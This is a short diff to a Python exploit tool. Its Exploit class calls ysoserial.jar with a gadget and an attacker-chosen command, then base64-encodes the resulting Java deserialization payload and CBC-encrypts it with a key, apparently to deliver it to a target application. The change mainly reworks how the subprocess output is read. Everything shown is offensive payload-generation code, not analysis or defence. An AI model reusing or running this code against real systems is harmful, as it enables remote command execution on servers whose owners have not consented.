@@ -259,14 +259,18 @@ class Exploit(Command):
         if self.key == None:
             return
 
-        popen = subprocess.Popen(['java', '-jar', os.path.join(
-            sys.path[0], "ysoserial.jar"), self.gadget, self.command], stdout=subprocess.PIPE)
+        with subprocess.Popen(['java', '-jar', os.path.join(sys.path[0], "ysoserial.jar"), self.gadget, self.command], stdout=subprocess.PIPE) as op:
+            popen = op.stdout.read()
 
-        if "Y SO SERIAL?" in popen.stderr.read().decode():
-            print("[!] Gadget not sport!\n")
-            return
+        try:
+            popen.decode()
+            if "Y SO SERIAL?" in popen.decode():
+                print("[!] Gadget not sport!\n")
+                return
+        except UnicodeDecodeError:
+            pass
 
-        file_body = base64.b64encode(popen.stdout.read())
+        file_body = base64.b64encode(popen)
 
         if self.type == 'CBC':
             payload = Payload(self.key).cbc_encrypt(file_body).decode()
